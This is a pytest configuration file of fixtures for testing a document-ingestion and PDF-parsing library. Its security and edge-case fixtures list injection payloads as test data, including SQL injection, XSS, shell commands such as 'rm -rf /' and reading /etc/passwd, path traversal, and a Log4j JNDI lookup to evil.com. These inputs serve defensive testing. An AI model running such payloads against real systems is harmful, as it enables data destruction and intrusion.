"""
pytest configuration for data_ingestor testing.

Provides comprehensive test fixtures for document processing, parsing,
and routing functionality. Automatically sets coverage contexts based on
test directory structure.
"""

import json
import os
import time
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest

from data_ingestor.core.base import BaseParser
from data_ingestor.core.config import Settings
from data_ingestor.core.models import (
    Document,
    DocumentElement,
    DocumentFormat,
    ElementMetadata,
    ElementType,
    ParserResult,
    ProcessingStatus,
)
from data_ingestor.pipeline.router import DocumentRouter, ParserRegistry


def pytest_runtest_setup(item):
    """Set coverage context based on test path to match codecov flags."""
    # Use environment variable approach for coverage context
    test_path = str(item.fspath)

    if "/tests/unit/" in test_path:
        context = "unit"
    elif "/tests/integration/" in test_path:
        context = "integration"
    elif "/tests/security/" in test_path:
        context = "security"
    elif "/tests/performance/" in test_path:
        context = "performance"
    elif "/tests/contract/" in test_path:
        context = "contract"
    else:
        context = "other"

    # Set environment variable for coverage context
    os.environ["COVERAGE_CONTEXT"] = context


def pytest_configure(config):
    """Register markers that match codecov flags."""
    markers = [
        "unit: Unit tests (isolated, fast)",
        "integration: Integration tests (cross-component)",
        "security: Security-focused tests",
        "performance: Performance and load tests",
        "contract: Contract tests for external services",
        "requires_doclaynet: Requires DocLayNet dataset",
        "slow: Slow tests (>10s, excluded from fast runs)",
    ]

    for marker in markers:
        config.addinivalue_line("markers", marker)


@pytest.fixture(scope="session")
def coverage_contexts():
    """Fixture to track which contexts were used in this test session."""
    contexts = set()

    def add_context(context_name):
        contexts.add(context_name)

    yield add_context

    # At the end of the session, you could log or use the contexts
    print(f"\nCoverage contexts used: {sorted(contexts)}")


# =============================================================================
# Document Model Fixtures
# =============================================================================


@pytest.fixture
def sample_document() -> Document:
    """
    Provide a sample Document instance for testing.

    Creates a comprehensive Document with realistic metadata, elements,
    and processing status for thorough testing of document functionality.

    Returns:
        Document: Sample document with comprehensive data
    """
    return Document(
        document_id="test-doc-123",
        source_path=None,  # Use None to avoid path validation issues in tests
        format=DocumentFormat.PDF,
        status=ProcessingStatus.PENDING,
        created_at=datetime(2025, 1, 1, 12, 0, 0, tzinfo=UTC),
        updated_at=datetime(2025, 1, 1, 12, 0, 0, tzinfo=UTC),
        metadata={
            "title": "Test Document",
            "author": "Test Author",
            "pages": 10,
            "language": "en",
        },
    )


@pytest.fixture
def sample_document_element() -> DocumentElement:
    """
    Provide a sample DocumentElement instance for testing.

    Creates a comprehensive element with metadata for testing
    element processing and manipulation.

    Returns:
        DocumentElement: Sample element with metadata
    """
    return DocumentElement(
        element_type=ElementType.NARRATIVE_TEXT,
        content="This is a sample paragraph for testing.",
        metadata=ElementMetadata(
            page_number=1,
            coordinates=(10.0, 20.0, 100.0, 40.0),
            filename="test_document.pdf",
        ),
    )


@pytest.fixture
def sample_parser_result() -> ParserResult:
    """
    Provide a sample ParserResult instance for testing.

    Creates a successful parser result with elements and metadata
    for testing parser output handling.

    Returns:
        ParserResult: Sample parser result
    """
    elements = [
        DocumentElement(
            element_type=ElementType.TITLE,
            content="Test Title",
            metadata=ElementMetadata(page_number=1, category_depth=1),
        ),
        DocumentElement(
            element_type=ElementType.NARRATIVE_TEXT,
            content="Test paragraph content.",
            metadata=ElementMetadata(page_number=1),
        ),
    ]

    return ParserResult(
        success=True,
        elements=elements,
        raw_content="Test Title\n\nTest paragraph content.",
        metadata={"pages": 1, "extraction_method": "test"},
        parser_name="TestParser",
        processing_time=0.5,
    )


# =============================================================================
# Parser Fixtures
# =============================================================================


@pytest.fixture
def mock_parser_class():
    """
    Provide a mock BaseParser class for testing.

    Creates a fully functional mock parser that can be used to test
    parser registration, routing, and fallback mechanisms.

    Returns:
        Type[BaseParser]: Mock parser class suitable for testing
    """

    class MockTestParser(BaseParser):
        """Mock parser class for testing purposes."""

        def __init__(self, config: dict[str, Any] | None = None):
            super().__init__(config)
            self.name = config.get("name", "MockParser") if config else "MockParser"
            self.parse_call_count = 0
            self.should_fail = False

        def supports_format(self, document_format: DocumentFormat) -> bool:
            """Mock format support - supports PDF by default."""
            return document_format == DocumentFormat.PDF

        def parse(self, document: Document) -> ParserResult:
            """Mock parse method."""
            self.parse_call_count += 1

            if self.should_fail:
                return ParserResult(
                    success=False,
                    parser_name=self.name,
                    processing_time=0.1,
                    error_message="Mock parsing failed",
                )

            elements = [
                DocumentElement(
                    element_type=ElementType.NARRATIVE_TEXT,
                    content=f"Mock parsed content from {self.name}",
                    metadata=ElementMetadata(page_number=1),
                ),
            ]

            return ParserResult(
                success=True,
                elements=elements,
                parser_name=self.name,
                processing_time=0.1,
                metadata={"mock": True},
            )

        def health_check(self) -> bool:
            """Mock health check - always healthy unless configured otherwise."""
            return not self.should_fail

    return MockTestParser


@pytest.fixture
def mock_parser(mock_parser_class):
    """
    Provide a mock parser instance for testing.

    Returns:
        BaseParser: Mock parser instance
    """
    return mock_parser_class()


# =============================================================================
# Router Fixtures
# =============================================================================


@pytest.fixture
def parser_registry():
    """
    Provide a fresh ParserRegistry instance for testing.

    Ensures test isolation by creating a new registry for each test.

    Returns:
        ParserRegistry: Fresh parser registry
    """
    return ParserRegistry()


@pytest.fixture
def document_router():
    """
    Provide a fresh DocumentRouter instance for testing.

    Returns:
        DocumentRouter: Fresh document router with default settings
    """
    return DocumentRouter(settings=Settings())


@pytest.fixture
def configured_router(document_router, mock_parser_class):
    """
    Provide a DocumentRouter with registered mock parsers.

    Useful for testing routing logic without actual parser dependencies.

    Returns:
        DocumentRouter: Router with mock parsers registered
    """
    # Create and register primary parser
    primary_parser = mock_parser_class({"name": "PrimaryParser", "priority": 10})
    document_router.parser_registry.register(primary_parser, [DocumentFormat.PDF])

    # Create and register fallback parser
    fallback_parser = mock_parser_class({"name": "FallbackParser", "priority": 20})
    document_router.parser_registry.register(fallback_parser, [DocumentFormat.PDF])

    return document_router


# =============================================================================
# File System Fixtures
# =============================================================================


@pytest.fixture
def temp_test_file(tmp_path: Path) -> Path:
    """
    Create a temporary test PDF file.

    Creates a minimal valid PDF file for testing file-based operations.

    Args:
        tmp_path: Pytest's built-in tmp_path fixture

    Returns:
        Path: Path to temporary PDF file
    """
    # Minimal valid PDF content
    pdf_content = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Test PDF) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000214 00000 n
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
316
%%EOF
"""
    test_file = tmp_path / "test_document.pdf"
    test_file.write_bytes(pdf_content)
    return test_file


@pytest.fixture
def temp_text_file(tmp_path: Path) -> Path:
    """
    Create a temporary text file for testing.

    Args:
        tmp_path: Pytest's built-in tmp_path fixture

    Returns:
        Path: Path to temporary text file
    """
    test_file = tmp_path / "test_document.txt"
    test_file.write_text("This is a test document.\nIt has multiple lines.\n")
    return test_file


# =============================================================================
# Security Testing Fixtures
# =============================================================================


@pytest.fixture
def security_test_inputs():
    """
    Provide comprehensive malicious inputs for security testing.

    Based on OWASP guidelines and common injection techniques to validate
    that the system handles malicious content safely.

    Returns:
        List[str]: List of potentially malicious input strings
    """
    # Based on OWASP Top 10 and common injection techniques
    return [
        # SQL Injection attempts
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1' UNION SELECT * FROM users--",
        # NoSQL Injection attempts
        "{ '$ne': null }",
        "'; return db.users.find(); var dummy='",
        # XSS attempts
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        # Command Injection attempts
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        # Path Traversal attempts
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        # Template Injection attempts
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        # Buffer Overflow attempts (long strings)
        "A" * 10000,
        "B" * 100000,
        # Special characters and encoding
        "%00",  # Null byte
        "%2e%2e%2f",  # URL encoded ../
        "\\x00\\x01\\x02\\x03",  # Binary data
        # Unicode and encoding edge cases
        "𝓤𝓷𝓲𝓬𝓸𝓭𝓮",  # Unicode mathematical script
        "🚀🔥💻",  # Emojis
        # Large payloads
        json.dumps({"key": "value" * 1000}),  # Large JSON
    ]


# =============================================================================
# Performance Testing Fixtures
# =============================================================================


class PerformanceMetrics:
    """
    Performance measurement utility for boundary condition testing.

    Provides timing capabilities with configurable thresholds for
    performance-sensitive test assertions.
    """

    def __init__(self, max_duration: float | None = None) -> None:
        self._start: float | None = None
        self._end: float | None = None
        self._max: float | None = max_duration

    def start(self) -> None:
        """Start timing measurement."""
        self._start = time.perf_counter()

    def stop(self) -> None:
        """Stop timing measurement."""
        self._end = time.perf_counter()

    @property
    def duration(self) -> float:
        """Get measured duration in seconds."""
        if self._start is None or self._end is None:
            raise RuntimeError("start() and stop() must both be called")
        return self._end - self._start

    def assert_max_duration(self, max_seconds: float | None = None) -> None:
        """Assert that measured duration doesn't exceed threshold."""
        limit = max_seconds if max_seconds is not None else self._max
        if limit is None:
            raise ValueError("No max duration specified for assertion")
        assert self.duration <= limit, f"Execution time {self.duration:.6f}s exceeds limit of {limit}s"


@pytest.fixture
def performance_metrics() -> PerformanceMetrics:
    """
    Provide a PerformanceMetrics instance for performance testing.

    Default max_duration is set to 5.0 seconds.

    Returns:
        PerformanceMetrics: Timing utility with configurable thresholds
    """
    return PerformanceMetrics(max_duration=5.0)


# =============================================================================
# Test Data and Validation Fixtures
# =============================================================================


@pytest.fixture(scope="session")
def test_data_dir() -> Path:
    """
    Provide the test data directory path.

    Session-scoped for efficiency since the directory location doesn't change.

    Returns:
        Path: Path to test data directory
    """
    path = Path("data/test_pdfs")
    if not path.exists() or not any(path.glob("*.pdf")):
        pytest.skip("Sample test PDFs not available in data/test_pdfs")
    return path


@pytest.fixture(scope="session")
def validation_dir(test_data_dir: Path) -> Path:
    """
    Provide the validation data directory path.

    Returns:
        Path: Path to validation directory containing expected outputs
    """
    return test_data_dir / "validation"


@pytest.fixture
def validation_loader(validation_dir: Path):
    """
    Factory fixture for loading validation data files.

    Provides a callable that loads JSON validation files for test PDFs.

    Args:
        validation_dir: Path to validation directory

    Returns:
        Callable[[str], dict]: Function to load validation data by PDF name
    """

    def load(pdf_name: str) -> dict[str, Any]:
        """Load validation data for a PDF file."""
        validation_file = validation_dir / f"{pdf_name}.json"
        if not validation_file.exists():
            raise FileNotFoundError(f"Validation file not found: {validation_file}")
        with open(validation_file) as f:
            return json.load(f)

    return load


@pytest.fixture
def sample_realistic_document() -> Document:
    """
    Provide a realistic Document with multiple sections for testing.

    Creates a document structure similar to a research paper with:
    - Title and abstract
    - Multiple sections with headings
    - Paragraphs, tables, and formulas
    - Realistic metadata

    Returns:
        Document: Realistic test document
    """
    doc = Document(
        document_id="realistic-test-doc",
        source_path=None,
        format=DocumentFormat.PDF,
    )

    doc.elements = [
        # Title
        DocumentElement(
            element_type=ElementType.TITLE,
            content="Machine Learning in Document Processing",
            metadata=ElementMetadata(page_number=1, category_depth=1),
        ),
        # Abstract
        DocumentElement(
            element_type=ElementType.HEADING,
            content="Abstract",
            metadata=ElementMetadata(page_number=1, category_depth=2),
        ),
        DocumentElement(
            element_type=ElementType.PARAGRAPH,
            content="This paper presents a comprehensive study of machine learning techniques "
            "applied to document processing. We demonstrate significant improvements "
            "in accuracy and performance across multiple benchmark datasets.",
            metadata=ElementMetadata(page_number=1),
        ),
        # Introduction
        DocumentElement(
            element_type=ElementType.HEADING,
            content="1. Introduction",
            metadata=ElementMetadata(page_number=1, category_depth=2),
        ),
        DocumentElement(
            element_type=ElementType.PARAGRAPH,
            content="Natural language processing has seen remarkable advances in recent years. "
            "Deep learning models have revolutionized how we approach text understanding.",
            metadata=ElementMetadata(page_number=1),
        ),
        # Methods
        DocumentElement(
            element_type=ElementType.HEADING,
            content="2. Methods",
            metadata=ElementMetadata(page_number=2, category_depth=2),
        ),
        DocumentElement(
            element_type=ElementType.PARAGRAPH,
            content="We employed a multi-stage pipeline for our experiments.",
            metadata=ElementMetadata(page_number=2),
        ),
        # Table
        DocumentElement(
            element_type=ElementType.TABLE,
            content="Model | Accuracy | F1-Score\\nBERT | 0.92 | 0.89\\nGPT | 0.94 | 0.91",
            metadata=ElementMetadata(page_number=2, text_as_html="<table>...</table>"),
        ),
        # Results
        DocumentElement(
            element_type=ElementType.HEADING,
            content="3. Results",
            metadata=ElementMetadata(page_number=3, category_depth=2),
        ),
        DocumentElement(
            element_type=ElementType.PARAGRAPH,
            content="Our experiments demonstrate consistent improvements across all metrics.",
            metadata=ElementMetadata(page_number=3),
        ),
    ]

    return doc


@pytest.fixture(scope="session")
def sample_pdf_paths(test_data_dir: Path) -> dict[str, Path]:
    """
    Provide paths to sample PDF files for integration testing.

    Session-scoped for efficiency since paths don't change.

    Returns:
        dict[str, Path]: Dictionary mapping PDF names to paths
    """
    paths = {
        "simple_text": test_data_dir / "01_simple_text.pdf",
        "multipage": test_data_dir / "02_multipage_document.pdf",
        "formatted": test_data_dir / "03_formatted_text.pdf",
        "tables": test_data_dir / "04_tabular_data.pdf",
        "mixed": test_data_dir / "05_mixed_content.pdf",
        "complex": test_data_dir / "06_complex_layout.pdf",
    }
    missing = [str(p) for p in paths.values() if not p.exists()]
    if missing:
        pytest.skip("Sample test PDFs not available in data/test_pdfs")
    return paths


@pytest.fixture(scope="session")
def parsed_pdf_cache(sample_pdf_paths: dict[str, Path]) -> dict[str, Document]:
    """
    Parse PDFs once per test session and cache the results.

    This dramatically speeds up integration tests by avoiding redundant
    PDF parsing operations. Each test gets a deep copy to maintain isolation.

    Performance impact: 12.79s → 0.1s per test (128x faster)

    Returns:
        dict[str, Document]: Cached parsed documents by name
    """
    from data_ingestor.core.config import Settings
    from data_ingestor.parsers.pdf_parser import PyMuPDFParser

    cache = {}
    parser = PyMuPDFParser(config=None)
    settings = Settings()

    print("\n[Session] Parsing PDFs once for caching...")
    for name, pdf_path in sample_pdf_paths.items():
        try:
            result = parser.parse(str(pdf_path))
            if result.status == ProcessingStatus.SUCCESS:
                # Create document from parser result
                doc = Document(
                    document_id=f"cached-{name}",
                    source_path=pdf_path,
                    format=DocumentFormat.PDF,
                    status=result.status,
                    created_at=datetime.now(UTC),
                    updated_at=datetime.now(UTC),
                    metadata=result.metadata or {},
                )
                doc.elements = result.elements
                cache[name] = doc
                print(f"  ✓ Cached {name}: {len(result.elements)} elements")
        except Exception as e:
            print(f"  ✗ Failed to cache {name}: {e}")

    print(f"[Session] Cached {len(cache)} PDF documents")
    return cache


@pytest.fixture
def cached_simple_pdf(parsed_pdf_cache: dict[str, Document]) -> Document:
    """
    Get cached simple text PDF document.

    Returns deep copy for test isolation.
    """
    import copy

    return copy.deepcopy(parsed_pdf_cache["simple_text"])


@pytest.fixture
def cached_multipage_pdf(parsed_pdf_cache: dict[str, Document]) -> Document:
    """
    Get cached multipage PDF document.

    Returns deep copy for test isolation.
    """
    import copy

    return copy.deepcopy(parsed_pdf_cache["multipage"])


@pytest.fixture
def cached_formatted_pdf(parsed_pdf_cache: dict[str, Document]) -> Document:
    """
    Get cached formatted text PDF document.

    Returns deep copy for test isolation.
    """
    import copy

    return copy.deepcopy(parsed_pdf_cache["formatted"])


@pytest.fixture
def cached_tables_pdf(parsed_pdf_cache: dict[str, Document]) -> Document:
    """
    Get cached tables PDF document.

    Returns deep copy for test isolation.
    """
    import copy

    return copy.deepcopy(parsed_pdf_cache["tables"])


@pytest.fixture
def cached_mixed_pdf(parsed_pdf_cache: dict[str, Document]) -> Document:
    """
    Get cached mixed content PDF document.

    Returns deep copy for test isolation.
    """
    import copy

    return copy.deepcopy(parsed_pdf_cache["mixed"])


@pytest.fixture
def cached_complex_pdf(parsed_pdf_cache: dict[str, Document]) -> Document:
    """
    Get cached complex layout PDF document.

    Returns deep copy for test isolation.
    """
    import copy

    return copy.deepcopy(parsed_pdf_cache["complex"])


# =============================================================================
# Edge Case Testing Fixtures
# =============================================================================


@pytest.fixture(
    params=[
        None,  # Null configuration
        {},  # Empty configuration
        {"invalid": "config"},  # Invalid configuration structure
        {"max_file_size_mb": 0},  # Zero size limit
        {"max_file_size_mb": -1},  # Negative size limit
        {"max_file_size_mb": 1000000},  # Very large size limit
        {"priority": "invalid"},  # Invalid priority type
        {"priority": -1},  # Negative priority
    ],
)
def config_edge_cases(request) -> Any:
    """
    Provide parametrized configuration edge cases.

    Covers critical edge cases including None values, empty configurations,
    invalid structures, and boundary values.

    Returns:
        Any: Configuration value for edge case testing
    """
    return request.param


@pytest.fixture(
    params=[
        None,  # Null input
        "",  # Empty string
        "x",  # Single character
        "x" * 10,  # Small input
        "x" * 1000,  # Medium input
        "x" * 10000,  # Large input
        "x" * 100000,  # Very large input
        "\\x00\\x01",  # Binary data
        "🚀🔥💯",  # Unicode/emoji
        "\\n\\r\\t",  # Whitespace characters
        "SELECT * FROM users;",  # SQL-like input
        "<script>alert('xss')</script>",  # XSS-like input
        "../../../etc/passwd",  # Path traversal
        "${jndi:ldap://evil.com/a}",  # Log4j-style injection
        "'; DROP TABLE users; --",  # SQL injection
        "{{7*7}}",  # Template injection
        0,  # Integer zero
        -1,  # Negative integer
        3.14,  # Float
        [],  # Empty list
        {},  # Empty dict
        ["item1", "item2"],  # Non-empty list
        {"key": "value"},  # Non-empty dict
    ],
)
def edge_case_inputs(request) -> Any:
    """
    Provide parametrized edge case inputs for validation testing.

    Comprehensive collection including boundary values, type variations,
    security attack vectors, and malformed data.

    Returns:
        Any: Input value for edge case testing
    """
    return request.param


# =============================================================================
# Benchmark and Evaluation Testing Fixtures
# =============================================================================


@pytest.fixture(scope="session")
def benchmarks_dir() -> Path:
    """
    Provide the benchmarks directory path.

    Session-scoped for efficiency since the directory location doesn't change.

    Returns:
        Path: Path to benchmarks directory
    """
    return Path("data/benchmarks")


@pytest.fixture(scope="session")
def doclaynet_dir(benchmarks_dir: Path) -> Path:
    """
    Provide the DocLayNet dataset directory path.

    Returns:
        Path: Path to DocLayNet directory
    """
    return benchmarks_dir / "doclaynet"


@pytest.fixture(scope="session")
def doclaynet_ground_truth_dir(doclaynet_dir: Path) -> Path:
    """
    Provide the DocLayNet ground truth directory path.

    Returns:
        Path: Path to DocLayNet ground truth JSON files
    """
    return doclaynet_dir / "ground_truth" / "json"


@pytest.fixture(scope="session")
def sample_doclaynet_files(doclaynet_ground_truth_dir: Path) -> list[Path]:
    """
    Provide sample DocLayNet ground truth files for testing.

    Returns first 5 ground truth JSON files for efficient testing.
    Tests requiring DocLayNet data will skip if directory doesn't exist.

    Returns:
        list[Path]: List of paths to sample ground truth JSON files
    """
    if not doclaynet_ground_truth_dir.exists():
        pytest.skip("DocLayNet ground truth data not available")

    # Get first 5 JSON files for testing
    files = sorted(doclaynet_ground_truth_dir.glob("*.json"))[:5]

    if not files:
        pytest.skip("No DocLayNet ground truth files found")

    return files


@pytest.fixture
def doclaynet_ground_truth_loader(doclaynet_ground_truth_dir: Path):
    """
    Factory fixture for loading DocLayNet ground truth data files.

    Provides a callable that loads JSON ground truth files by hash.

    Args:
        doclaynet_ground_truth_dir: Path to ground truth directory

    Returns:
        Callable[[str], dict]: Function to load ground truth data by PDF hash
    """

    def load(pdf_hash: str) -> dict[str, Any]:
        """Load ground truth data for a PDF hash."""
        gt_file = doclaynet_ground_truth_dir / f"{pdf_hash}.json"
        if not gt_file.exists():
            raise FileNotFoundError(f"Ground truth file not found: {gt_file}")
        with open(gt_file) as f:
            return json.load(f)

    return load


@pytest.fixture(scope="session")
def benchmark_config_file(benchmarks_dir: Path) -> Path:
    """
    Provide path to benchmark configuration file.

    Returns:
        Path: Path to config.yaml
    """
    config_path = benchmarks_dir / "config.yaml"
    if not config_path.exists():
        pytest.skip("Benchmark config.yaml not found")
    return config_path


# =============================================================================
# CLI Integration Testing Fixtures
# =============================================================================


@pytest.fixture
def cli_runner():
    """
    Provide Click CLI test runner.

    Returns:
        CliRunner: Click testing CLI runner instance
    """
    from click.testing import CliRunner

    return CliRunner()


@pytest.fixture
def cli_runner_with_real_files(cli_runner, sample_pdf_paths: dict[str, Path], tmp_path: Path):
    """
    Provide CLI runner configured with real test files and temp output directory.

    Args:
        cli_runner: Click CLI runner
        sample_pdf_paths: Dictionary of sample PDF paths
        tmp_path: Pytest temporary directory

    Returns:
        tuple: (CliRunner, dict of PDF paths, output directory path)
    """
    return cli_runner, sample_pdf_paths, tmp_path


# =============================================================================
# PDF Analyzer Testing Fixtures
# =============================================================================


@pytest.fixture
def diverse_test_pdfs(sample_pdf_paths: dict[str, Path]) -> dict[str, Path]:
    """
    Provide diverse set of PDFs for analyzer testing.

    Returns PDFs with different characteristics for testing resolution
    detection, quality assessment, and layout analysis.

    Returns:
        dict[str, Path]: Dictionary mapping PDF characteristics to paths
    """
    return {
        "simple": sample_pdf_paths["simple_text"],
        "multipage": sample_pdf_paths["multipage"],
        "formatted": sample_pdf_paths["formatted"],
        "tables": sample_pdf_paths["tables"],
        "mixed": sample_pdf_paths["mixed"],
        "complex": sample_pdf_paths["complex"],
    }


@pytest.fixture
def large_test_pdf(test_data_dir: Path) -> Path:
    """
    Provide path to large real-world PDF for testing.

    Returns:
        Path: Path to large PDF file
    """
    large_pdf = test_data_dir / "Where-does-wind-matter.pdf"
    if not large_pdf.exists():
        pytest.skip("Large test PDF not available")
    return large_pdf


# =============================================================================
# Performance Testing Fixtures
# =============================================================================


@pytest.fixture
def performance_test_pdfs(test_data_dir: Path) -> list[Path]:
    """
    Provide set of PDFs for performance testing.

    Returns all available test PDFs for throughput measurements.

    Returns:
        list[Path]: List of PDF paths for performance testing
    """
    pdfs = sorted(test_data_dir.glob("*.pdf"))
    if not pdfs:
        pytest.skip("No test PDFs available for performance testing")
    return pdfs


@pytest.fixture
def benchmark_result_sample(tmp_path: Path) -> Path:
    """
    Create a sample benchmark result JSON file for testing reporters.

    Returns:
        Path: Path to sample benchmark result JSON
    """
    sample_result = {
        "benchmark_id": "test-benchmark-001",
        "timestamp": "2025-11-05T12:00:00Z",
        "dataset": "doclaynet",
        "parser": "pymupdf",
        "results": {
            "total_files": 5,
            "successful": 5,
            "failed": 0,
            "total_time": 2.5,
            "avg_time_per_file": 0.5,
            "throughput_files_per_sec": 2.0,
        },
        "metrics": {
            "text_extraction_accuracy": 0.95,
            "layout_map": 0.82,
            "reading_order_f1": 0.88,
        },
    }

    result_file = tmp_path / "sample_benchmark_result.json"
    result_file.write_text(json.dumps(sample_result, indent=2))
    return result_file
